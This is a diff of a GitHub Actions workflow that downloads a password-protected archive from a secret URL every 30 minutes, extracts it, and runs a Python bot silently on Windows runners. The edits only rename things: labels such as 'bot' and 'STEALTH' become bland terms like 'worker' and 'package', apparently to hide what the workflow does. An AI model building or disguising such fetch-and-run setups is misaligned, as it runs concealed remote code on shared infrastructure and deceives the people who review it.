@@ -1,4 +1,4 @@
-name: Bot Runner Windows (Secrets Safe)
+name: Windows Worker
 
 on:
   workflow_dispatch:
@@ -6,36 +6,36 @@ on:
     - cron: "*/30 * * * *"
 
 concurrency:
-  group: bot-worker
+  group: worker
   cancel-in-progress: true
 
 jobs:
-  run-bot:
+  worker:
     runs-on: windows-latest
     timeout-minutes: 90
 
     steps:
       - uses: actions/checkout@v3
 
-      - name: Install 7-Zip (silent)
+      - name: Prepare dependencies
         run: choco install 7zip -y --no-progress > $null
 
-      - name: Download bot archive (silent)
+      - name: Download package
         shell: powershell
         env:
-          BOT_LINK: ${{ secrets.LINK }}
+          SRC_URL: ${{ secrets.LINK }}
         run: |
           $ProgressPreference = 'SilentlyContinue'
-          Invoke-WebRequest -Uri "$Env:BOT_LINK" -OutFile "bot.7z" > $null
+          Invoke-WebRequest -Uri "$Env:SRC_URL" -OutFile "app.7z" > $null
 
-      - name: Extract bot archive (silent)
+      - name: Extract package
         shell: powershell
         env:
-          BOT_PASSWORD: ${{ secrets.PASSWORD }}
+          ARCHIVE_KEY: ${{ secrets.PASSWORD }}
         run: |
-          & "C:\Program Files\7-Zip\7z.exe" x bot.7z -p"$Env:BOT_PASSWORD" -oextracted -y > $null
+          & "C:\Program Files\7-Zip\7z.exe" x app.7z -p"$Env:ARCHIVE_KEY" -oextracted -y > $null
 
-      - name: Run bot.py (STEALTH)
+      - name: Run worker
         shell: powershell
         run: |
-          python extracted\bot.py *> $null
+          python extracted\worker.py *> $null
